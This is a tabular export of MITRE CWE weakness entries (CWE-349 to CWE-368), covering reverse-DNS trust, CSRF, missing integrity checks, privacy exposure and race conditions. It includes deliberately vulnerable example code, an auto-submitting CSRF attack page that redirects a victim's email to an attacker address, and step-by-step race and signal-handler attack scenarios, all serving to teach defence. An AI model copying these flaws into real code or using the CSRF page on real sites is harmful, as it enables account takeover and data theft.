CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data,"The product, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted.","Scope: Access ControlIntegrity, Impact: Technical Impact:Bypass Protection Mechanism; Modify Application DataAn attacker could package untrusted data with trusted data to bypass protection mechanisms to gain access to and possibly modify sensitive data., Likelihood: ",无示范例子,无可能的缓解方案
CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action,"The product performs reverse DNS resolution on an IP address to obtain the hostname and make a security decision, but it does not properly ensure that the IP address is truly associated with the hostname.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection MechanismMalicious users can fake authentication information by providing false DNS information., Likelihood: ","Example 1The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.(bad code)Example Language:Cstruct hostent *hp;struct in_addr myaddr;char* tHost = ""trustme.example.com"";myaddr.s_addr=inet_addr(ip_addr_string);hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {trusted = true;} else {trusted = false;}(bad code)Example Language:JavaString ip = request.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {trusted = true;}(bad code)Example Language:C#IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);if (hostInfo.HostName.EndsWith(""trustme.com"")) {trusted = true;}IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.Example 2In these examples, a connection is established if a request is made by a trusted host.(bad code)Example Language:Csd = socket(AF_INET, SOCK_DGRAM, 0);serv.sin_family = AF_INET;serv.sin_addr.s_addr = htonl(INADDR_ANY);servr.sin_port = htons(1008);bind(sd, (struct sockaddr *) & serv, sizeof(serv));while (1) {memset(msg, 0x0, MAX_MSG);clilen = sizeof(cli);h=gethostbyname(inet_ntoa(cliAddr.sin_addr));if (h->h_name==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);}(bad code)Example Language:Javawhile(true) {DatagramPacket rp=new DatagramPacket(rData,rData.length);outSock.receive(rp);String in = new String(p.getData(),0, rp.getLength());InetAddress IPAddress = rp.getAddress();int port = rp.getPort();if ((rp.getHostName()==...) & (in==...)) {out = secret.getBytes();DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port);outSock.send(sp);}}These examples check if a request is from a trusted host before responding to a request, but the code only verifies the hostname as stored in the request packet. An attacker can spoof the hostname, thus impersonating a trusted client.",Phase:  Architecture and DesignUse other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate.Phase:  ImplementationPerform proper forward and reverse DNS lookups to detect DNS spoofing.
CWE-351: Insufficient Type Distinction,The product does not properly distinguish between different types of elements in a way that leads to insecure behavior.,"Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,无可能的缓解方案
CWE-352: Cross-Site Request Forgery (CSRF),"The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.","Scope: ConfidentialityIntegrityAvailabilityNon-RepudiationAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism; Read Application Data; Modify Application Data; DoS: Crash, Exit, or RestartThe consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges., Likelihood: ","Example 1This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.The following HTML is intended to allow a user to update a profile.(bad code)Example Language:HTML<form action=""/url/profile.php"" method=""post""><input type=""text"" name=""firstname""/><input type=""text"" name=""lastname""/><br/><input type=""text"" name=""email""/><input type=""submit"" name=""submit"" value=""Update""/></form>profile.php contains the following code.(bad code)Example Language:PHP// initiate the session in order to validate sessionssession_start();//if the session is registered to a valid user then allow updateif (! session_is_registered(""username"")) {echo ""invalid session detected!"";// Redirect user to login page[...]exit;}// The user session is valid, so process the request// and update the informationupdate_profile();function update_profile {// read in the data from $POST and send an update// to the databaseSendUpdateToDatabase($_SESSION['username'], $_POST['email']);[...]echo ""Your profile has been successfully updated."";}This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:(attack code)Example Language:HTML<SCRIPT>function SendAttack () {form.email = ""attacker@example.com"";// send to profile.phpform.submit();}</SCRIPT><BODY onload=""javascript:SendAttack();""><form action=""http://victim.example.com/profile.php"" id=""form"" method=""post""><input type=""hidden"" name=""firstname"" value=""Funny""><input type=""hidden"" name=""lastname"" value=""Joke""><br/><input type=""hidden"" name=""email""></form>Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330]Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]Phase:  ImplementationEnsure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.Phase:  Architecture and DesignGenerate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]Note:Note that this can be bypassed using XSS (CWE-79).Phase:  Architecture and DesignIdentify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.Note:Note that this can be bypassed using XSS (CWE-79).Phase:  Architecture and DesignUse the ""double-submitted cookie"" method as described by Felten and Zeller:When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]Note:Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests.Phase:  Architecture and DesignDo not use the GET method for any request that triggers a state change.Phase:  ImplementationCheck the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.Note:Note that this can be bypassed using XSS (CWE-79). An attacker could use XSS to generate a spoofed Referer, or to generate a malicious request from a page whose Referer would be allowed."
CWE-353: Missing Support for Integrity Check,"The product uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.","Scope: IntegrityOther, Impact: Technical Impact:OtherData that is parsed and used may be corrupted., Likelihood: ; Scope: Non-RepudiationOther, Impact: Technical Impact:Hide Activities; OtherWithout a checksum it is impossible to determine if any changes have been made to the data after it was sent., Likelihood: ","Example 1In this example, a request packet is received, and privileged information is sent to the requester:(bad code)Example Language:Javawhile(true) {DatagramPacket rp = new DatagramPacket(rData,rData.length);outSock.receive(rp);InetAddress IPAddress = rp.getAddress();int port = rp.getPort();out = secret.getBytes();DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port);outSock.send(sp);}The response containing secret data has no integrity check associated with it, allowing an attacker to alter the message without detection.","Phase:  Architecture and DesignAdd an appropriately sized checksum to the protocol, ensuring that data received may be simply validated before it is parsed and used.Phase:  ImplementationEnsure that the checksums present in the protocol design are properly implemented and added to each message before it is sent."
CWE-354: Improper Validation of Integrity Check Value,"The product does not validate or incorrectly validates the integrity check values or ""checksums"" of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission.","Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; OtherIntegrity checks usually use a secret key that helps authenticate the data origin. Skipping integrity checking generally opens up the possibility that new data from an invalid source can be injected., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherData that is parsed and used may be corrupted., Likelihood: ; Scope: Non-RepudiationOther, Impact: Technical Impact:Hide Activities; OtherWithout a checksum check, it is impossible to determine if any changes have been made to the data after it was sent., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Csd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET;serv.sin_addr.s_addr = htonl(INADDR_ANY);servr.sin_port = htons(1008);bind(sd, (struct sockaddr *) & serv, sizeof(serv));while (1) {memset(msg, 0x0, MAX_MSG);clilen = sizeof(cli);if (inet_ntoa(cli.sin_addr)==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);}(bad code)Example Language:Javawhile(true) {DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);socket.send(sendPacket);}",Phase:  ImplementationEnsure that the checksums present in messages are properly checked in accordance with the protocol specification before they are parsed and used.
CWE CATEGORY: User Interface Security Issues,Weaknesses in this category are related to or introduced in the User Interface (UI).,无常见后果信息,无示范例子,无可能的缓解方案
CWE-356: Product UI does not Warn User of Unsafe Actions,The product's user interface does not warn the user before undertaking an unsafe action on behalf of that user. This makes it easier for attackers to trick users into inflicting damage to their system.,"Scope: Non-Repudiation, Impact: Technical Impact:Hide Activities, Likelihood: ",无示范例子,无可能的缓解方案
CWE-357: Insufficient UI Warning of Dangerous Operations,"The user interface provides a warning to a user regarding dangerous or sensitive operations, but the warning is not noticeable enough to warrant attention.","Scope: Non-Repudiation, Impact: Technical Impact:Hide Activities, Likelihood: ",无示范例子,无可能的缓解方案
CWE-358: Improperly Implemented Security Check for Standard,"The product does not implement or incorrectly implements one or more security-relevant checks as specified by the design of a standardized algorithm, protocol, or technique.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-359: Exposure of Private Personal Information to an Unauthorized Actor,"The product does not properly prevent a person's private, personal information from being accessed by actors who either (1) are not explicitly authorized to access the information or (2) do not have the implicit consent of the person about whom the information is collected.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the getPassword() function returns the user-supplied plaintext password associated with the account.(bad code)Example Language:C#pass = GetPassword();...dbmsLog.WriteLine(id + "":"" + pass + "":"" + type + "":"" + tstamp);The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.Example 2This code uses location to determine the user's current US State location.First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:(bad code)Example Language:XML<uses-permission android:name=""android.permission.ACCESS_FINE_LOCATION""/>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:(bad code)Example Language:JavalocationClient = new LocationClient(this, this, this);locationClient.connect();Location userCurrLocation;userCurrLocation = locationClient.getLastLocation();deriveStateFromCoords(userCurrLocation);While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.Example 3In 2004, an employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [REF-338]. In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated.","Phase:  RequirementsIdentify and consult all relevant regulations for personal privacy. An organization may be required to comply with certain federal and state regulations, depending on its location, the type of business it conducts, and the nature of any private data it handles. Regulations may include Safe Harbor Privacy Framework [REF-340], Gramm-Leach Bliley Act (GLBA) [REF-341], Health Insurance Portability and Accountability Act (HIPAA) [REF-342], General Data Protection Regulation (GDPR) [REF-1047], California Consumer Privacy Act (CCPA) [REF-1048], and others.Phase:  Architecture and DesignCarefully evaluate how secure design may interfere with privacy, and vice versa. Security and privacy concerns often seem to compete with each other. From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified. However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted."
CWE-360: Trust of System Event Data,Security based on event locations are insecure and can be spoofed.,"Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Execute Unauthorized Code or CommandsIf one trusts the system-event information and executes commands based on it, one could potentially take actions based on a spoofed identity., Likelihood: ","Example 1This example code prints out secret information when an authorized user activates a button:(bad code)Example Language:Javapublic void actionPerformed(ActionEvent e) {if (e.getSource() == button) {System.out.println(""print out secret information"");}}This code does not attempt to prevent unauthorized users from activating the button. Even if the button is rendered non-functional to unauthorized users in the application UI, an attacker can easily send a false button press event to the application window and expose the secret information.",Phase:  Architecture and DesignNever trust or rely any of the information in an Event for security.
CWE CATEGORY: 7PK - Time and State,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses related to the improper management of time and state in an environment that supports simultaneous or near-simultaneous computation by multiple systems, processes, or threads. According to the authors of the Seven Pernicious Kingdoms, ""Distributed computation is about time and state. That is, in order for more than one component to communicate, state must be shared, and all that takes time. Most programmers anthropomorphize their work. They think about one thread of control carrying out the entire program in the same way they would if they had to do the job themselves. Modern computers, however, switch between tasks very quickly, and in multi-core, multi-CPU, or distributed systems, two events may take place at exactly the same time. Defects rush to fill the gap between the programmer's model of how a program executes and what happens in reality. These defects are related to unexpected interactions between threads, processes, time, and information. These interactions happen through shared state: semaphores, variables, the file system, and, basically, anything that can store information.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'),"The product contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other)When a race condition makes it possible to bypass a resource cleanup routine or trigger multiple initialization routines, it may lead to resource exhaustion (CWE-400)., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: InstabilityWhen a race condition allows multiple control flows to access a resource simultaneously, it might lead the product(s) into unexpected states, possibly resulting in a crash., Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Read Application DataWhen a race condition is combined with predictable resource names and loose permissions, it may be possible for an attacker to overwrite or access confidential data (CWE-59)., Likelihood:","Example 1This code could be used in an e-commerce application that supports transfers between accounts. It takes the total amount of the transfer, sends it to the new account, and deducts the amount from the original account.(bad code)Example Language:Perl$transfer_amount = GetTransferAmount();$balance = GetBalanceFromDatabase();if ($transfer_amount < 0) {FatalError(""Bad Transfer Amount"");}$newbalance = $balance - $transfer_amount;if (($balance - $transfer_amount) < 0) {FatalError(""Insufficient Funds"");}SendNewBalanceToDatabase($newbalance);NotifyUser(""Transfer of $transfer_amount succeeded."");NotifyUser(""New balance: $newbalance"");A race condition could occur between the calls to GetBalanceFromDatabase() and SendNewBalanceToDatabase().Suppose the balance is initially 100.00. An attack could be constructed as follows:(attack code)Example Language:OtherIn the following pseudocode, the attacker makes two simultaneous calls of the program, CALLER-1 and CALLER-2. Both callers are for the same user account.CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance that handles CALLER-1). CALLER-2 is associated with PROGRAM-2.CALLER-1 makes a transfer request of 80.00.PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to 100.00PROGRAM-1 calculates $newbalance as 20.00, then calls SendNewBalanceToDatabase().Due to high server load, the PROGRAM-1 call to SendNewBalanceToDatabase() encounters a delay.CALLER-2 makes a transfer request of 1.00.PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to 100.00. This happens because the previous PROGRAM-1 request was not processed yet.PROGRAM-2 determines the new balance as 99.00.After the initial delay, PROGRAM-1 commits its balance to the database, setting it to 20.00.PROGRAM-2 sends a request to update the database, setting the balance to 99.00At this stage, the attacker should have a balance of 19.00 (due to 81.00 worth of transfers), but the balance is 99.00, as recorded in the database.To prevent this weakness, the programmer has several options, including using a lock to prevent multiple simultaneous requests to the web application, or using a synchronization mechanism that includes all the code between GetBalanceFromDatabase() and SendNewBalanceToDatabase().Example 2The following function attempts to acquire a lock in order to perform operations on a shared resource.(bad code)Example Language:Cvoid f(pthread_mutex_t *mutex) {pthread_mutex_lock(mutex);/* access shared resource */pthread_mutex_unlock(mutex);}However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.(good code)Example Language:Cint f(pthread_mutex_t *mutex) {int result;result = pthread_mutex_lock(mutex);if (0 != result)return result;/* access shared resource */return pthread_mutex_unlock(mutex);}Example 3Suppose a processor's Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of ""accessible"" memory. Any time this accessible range changes (as per the processor's boot status), the main MMU sends an update message to all the shadow MMUs.Suppose the interconnect fabric does not prioritize such ""update"" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario.","Phase:  Architecture and DesignIn languages that support it, use synchronization primitives. Only wrap these around critical code to minimize the impact on performance.Phase:  Architecture and DesignUse thread-safe capabilities such as the data access abstraction in Spring.Phase:  Architecture and DesignMinimize the usage of shared resources in order to remove as much complexity as possible from the control flow and to reduce the likelihood of unexpected conditions occurring.Additionally, this will minimize the amount of synchronization necessary and may even help to reduce the likelihood of a denial of service where an attacker may be able to repeatedly trigger a critical section (CWE-400).Phase:  ImplementationWhen using multithreading and operating on shared variables, only use thread-safe functions.Phase:  ImplementationUse atomic operations on shared variables. Be wary of innocent-looking constructs such as ""x++"". This may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read, followed by a computation, followed by a write.Phase:  ImplementationUse a mutex if available, but be sure to avoid related weaknesses such asCWE-412.Phase:  ImplementationAvoid double-checked locking (CWE-609) and other implementation errors that arise when trying to avoid the overhead of synchronization.Phase:  ImplementationDisable interrupts or signals over critical parts of the code, but also make sure that the code does not go into a large or infinite loop.Phase:  ImplementationUse the volatile type modifier for critical variables to avoid unexpected compiler optimization or reordering. This does not necessarily solve the synchronization problem, but it can help.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
CWE-363: Race Condition Enabling Link Following,"The product checks the status of a file or directory before accessing it, which produces a race condition in which the file can be replaced with a link before the access is performed, causing the product to access the wrong file.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ","Example 1This code prints the contents of a file if a user has permission.(bad code)Example Language:PHPfunction readFile($filename){$user = getCurrentUser();//resolve file if its a symbolic linkif(is_link($filename)){$filename = readlink($filename);}if(fileowner($filename) == $user){echo file_get_contents($realFile);return;}else{echo 'Access denied';return false;}}This code attempts to resolve symbolic links before checking the file and printing its contents. However, an attacker may be able to change the file from a real file to a symbolic link between the calls to is_link() and file_get_contents(), allowing the reading of arbitrary files. Note that this code fails to log the attempted access (CWE-778).",无可能的缓解方案
CWE-364: Signal Handler Race Condition,The product uses a signal handler that introduces a race condition.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Application Data; Modify Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or CommandsIt may be possible to cause data corruption and possibly execute arbitrary code by modifying global variables or data structures at unexpected times, violating the assumptions of code that uses this global data., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf a signal handler interrupts code that is executing with privileges, it may be possible that the signal handler will also be executed with elevated privileges, possibly making subsequent exploits more severe., Likelihood: ","Example 1This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits.(bad code)Example Language:Cchar *logMessage;void handler (int sigNum) {syslog(LOG_NOTICE, ""%s\n"", logMessage);free(logMessage);/* artificially increase the size of the timing window to make demonstration of this weakness easier. */sleep(10);exit(0);}int main (int argc, char* argv[]) {logMessage = strdup(argv[1]);/* Register signal handlers. */signal(SIGHUP, handler);signal(SIGTERM, handler);/* artificially increase the size of the timing window to make demonstration of this weakness easier. */sleep(10);}The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.The program begins its ""normal"" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.The attacker sends SIGHUP, which invokes handler (call this ""SIGHUP-handler"").SIGHUP-handler begins to execute, calling syslog().syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.The attacker then sends SIGTERM.SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.The SIGTERM handler is invoked.SIGTERM-handler records the log message using syslog(), then frees the logMessage variable.At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running.Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution.Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array.Example 2The following code registers a signal handler with multiple signals in order to log when a specific event occurs and to free associated memory before exiting.(bad code)Example Language:C#include <signal.h>#include <syslog.h>#include <string.h>#include <stdlib.h>void *global1, *global2;char *what;void sh (int dummy) {syslog(LOG_NOTICE,""%s\n"",what);free(global2);free(global1);/* Sleep statements added to expand timing window for race condition */sleep(10);exit(0);}int main (int argc,char* argv[]) {what=argv[1];global1=strdup(argv[2]);global2=malloc(340);signal(SIGHUP,sh);signal(SIGTERM,sh);/* Sleep statements added to expand timing window for race condition */sleep(10);exit(0);}However, the following sequence of events may result in a double-free (CWE-415):a SIGHUP is delivered to the processsh() is invoked to process the SIGHUPThis first invocation of sh() reaches the point where global1 is freedAt this point, a SIGTERM is sent to the processthe second invocation of sh() might do another free of global1this results in a double-free (CWE-415)This is just one possible exploitation of the above code. As another example, the syslog call may use malloc calls which are not async-signal safe. This could cause corruption of the heap management structures. For more details, consult the example within ""Delivering Signals for Fun and Profit"" [REF-360].","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Phase:  Architecture and DesignDesign signal handlers to only set flags, rather than perform complex functionality. These flags can then be checked and acted upon within the main program loop.Phase:  ImplementationOnly use reentrant functions within signal handlers. Also, use validation to ensure that state is consistent while performing asynchronous actions that affect the state of execution."
CWE-365: DEPRECATED: Race Condition in Switch,This entry has been deprecated. There are no documented cases in which a switch's control expression is evaluated more than once.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-366: Race Condition within a Thread,"If two threads of execution use a resource simultaneously, there exists the possibility that resources may be used while invalid, in turn making the state of execution undefined.","Scope: IntegrityOther, Impact: Technical Impact:Alter Execution Logic; Unexpected StateThe main problem is that -- if a lock is overcome -- data could be altered in a bad state., Likelihood: ",Example 1The following example demonstrates the weakness.(bad code)Example Language:Cint foo = 0;int storenum(int num) {static int counter = 0;counter++;if (num > foo) foo = num;return foo;}(bad code)Example Language:Javapublic classRace {static int foo = 0;public static void main() {new Threader().start();foo = 1;}public static class Threader extends Thread {public void run() {System.out.println(foo);}}},"Phase:  Architecture and DesignUse locking functionality. This is the recommended solution. Implement some form of locking mechanism around code which alters or reads persistent data in a multithreaded environment.Phase:  Architecture and DesignCreate resource-locking validation checks. If no inherent locking mechanisms exist, use flags and signals to enforce your own blocking scheme when resources are being used by other threads of execution."
CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition,"The product checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the product to perform invalid actions when the resource is in an unexpected state.","Scope: IntegrityOther, Impact: Technical Impact:Alter Execution Logic; Unexpected StateThe attacker can gain access to otherwise unauthorized resources., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:Modify Application Data; Modify Files or Directories; Modify Memory; OtherRace conditions such as this kind may be employed to gain read or write access to resources which are not normally readable or writable by the user in question., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherThe resource in question, or other resources (through the corrupted one), may be changed in undesirable ways by a malicious user., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesIf a file or other resource is written in this method, as opposed to in a valid way, logging of the activity may not occur., Likelihood: ; Scope: Non-RepudiationOther, Impact: Technical Impact:OtherIn some cases it may be possible to delete files a malicious user might not otherwise have access to, such as log files., Likelihood: ","Example 1The following code checks a file, then updates its contents.(bad code)Example Language:Cstruct stat *sb;...lstat(""..."",sb); // it has not been updated since the last time it was readprintf(""stated file\n"");if (sb->st_mtimespec==...){print(""Now updating things\n"");updateThings();}Potentially the file could have been updated between the time of the check and the lstat, especially since the printf has latency.Example 2The following code is from a program installed setuid root. The program performs certain file operations on behalf of non-privileged users, and uses access checks to ensure that it does not use its root privileges to perform operations that should otherwise be unavailable the current user. The program uses the access() system call to check if the person running the program has permission to access the specified file before it opens the file and performs the necessary operations.(bad code)Example Language:Cif(!access(file,W_OK)) {f = fopen(file,""w+"");operate(f);...}else {fprintf(stderr,""Unable to open file %s.\n"",file);}The call to access() behaves as expected, and returns 0 if the user running the program has the necessary permissions to write to the file, and -1 otherwise. However, because both access() and fopen() operate on filenames rather than on file handles, there is no guarantee that the file variable still refers to the same file on disk when it is passed to fopen() that it did when it was passed to access(). If an attacker replaces file after the call to access() with a symbolic link to a different file, the program will use its root privileges to operate on the file even if it is a file that the attacker would otherwise be unable to modify. By tricking the program into performing an operation that would otherwise be impermissible, the attacker has gained elevated privileges. This type of vulnerability is not limited to programs with root privileges. If the application is capable of performing any operation that the attacker would not otherwise be allowed perform, then it is a possible target.Example 3This code prints the contents of a file if a user has permission.(bad code)Example Language:PHPfunction readFile($filename){$user = getCurrentUser();//resolve file if its a symbolic linkif(is_link($filename)){$filename = readlink($filename);}if(fileowner($filename) == $user){echo file_get_contents($realFile);return;}else{echo 'Access denied';return false;}}This code attempts to resolve symbolic links before checking the file and printing its contents. However, an attacker may be able to change the file from a real file to a symbolic link between the calls to is_link() and file_get_contents(), allowing the reading of arbitrary files. Note that this code fails to log the attempted access (CWE-778).Example 4This example is adapted from [REF-18]. Assume that this code block is invoked from multiple threads. The switch statement will execute different code depending on the time when MYFILE.txt was last changed.(bad code)Example Language:C#include <sys/types.h>#include <sys/stat.h>...struct stat sb;stat(""MYFILE.txt"",&sb);printf(""file change time: %d\n"",sb->st_ctime);switch(sb->st_ctime % 2){case 0: printf(""Option 1\n""); break;case 1: printf(""Option 2\n""); break;default: printf(""this should be unreachable?\n""); break;}If this code block were executed within multiple threads, and MYFILE.txt changed between the operation of one thread and another, then the switch could produce different, possibly unexpected results.","Phase:  ImplementationThe most basic advice for TOCTOU vulnerabilities is to not perform a check before the use. This does not resolve the underlying issue of the execution of a function on a resource whose state and identity cannot be assured, but it does help to limit the false sense of security given by the check.Phase:  ImplementationWhen the file being altered is owned by the current user and group, set the effective gid and uid to that of the current user and group when executing this statement.Phase:  Architecture and DesignLimit the interleaving of operations on files from multiple processes.Phases:  Implementation; Architecture and DesignIf you cannot perform operations atomically and you must share access to the resource between multiple processes or threads, then try to limit the amount of time (CPU cycles) between the check and use of the resource. This will not fix the problem, but it could make it more difficult for an attack to succeed.Phase:  ImplementationRecheck the resource after the use call to verify that the action was taken appropriately.Phase:  Architecture and DesignEnsure that some environmental locking mechanism can be used to protect resources effectively.Phase:  ImplementationEnsure that locking occurs before the check, as opposed to afterwards, such that the resource, as checked, is the same as it is when in use."
CWE-368: Context Switching Race Condition,"A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries, but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Modify Application Data; Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
